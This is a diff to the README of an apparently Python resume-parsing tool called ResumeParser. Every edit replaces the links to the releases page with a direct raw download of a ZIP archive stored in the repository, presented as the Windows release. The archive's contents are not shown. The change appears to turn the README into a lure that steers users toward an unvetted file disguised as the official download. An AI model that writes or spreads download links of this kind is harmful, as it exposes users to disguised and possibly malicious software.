@@ -1,12 +1,12 @@
 # 🧾 ResumeParser - Turn Resume Text Into Clean Data
 
-[![Download ResumeParser](https://img.shields.io/badge/Download%20ResumeParser-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dacianst1538/ResumeParser/releases)
+[![Download ResumeParser](https://img.shields.io/badge/Download%20ResumeParser-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip)
 
 ## 📥 Download
 
 Visit this page to download the Windows release:
 
-[https://github.com/dacianst1538/ResumeParser/releases](https://github.com/dacianst1538/ResumeParser/releases)
+[https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip](https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip)
 
 ## ✨ What ResumeParser does
 
@@ -36,7 +36,7 @@ If your release comes as a ZIP file, Windows can open it without extra tools. If
 ## 🚀 Get started on Windows
 
 1. Open the download page:
-   [https://github.com/dacianst1538/ResumeParser/releases](https://github.com/dacianst1538/ResumeParser/releases)
+   [https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip](https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip)
 
 2. Find the latest release.
 
@@ -206,4 +206,4 @@ async, backend, fastapi, heuristics, nlp, python, regex, rest-api, resume-parser
 
 Use this page to get the latest Windows release:
 
-[https://github.com/dacianst1538/ResumeParser/releases](https://github.com/dacianst1538/ResumeParser/releases)
+[https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip](https://github.com/dacianst1538/ResumeParser/raw/refs/heads/main/app/Resume_Parser_v2.5.zip)
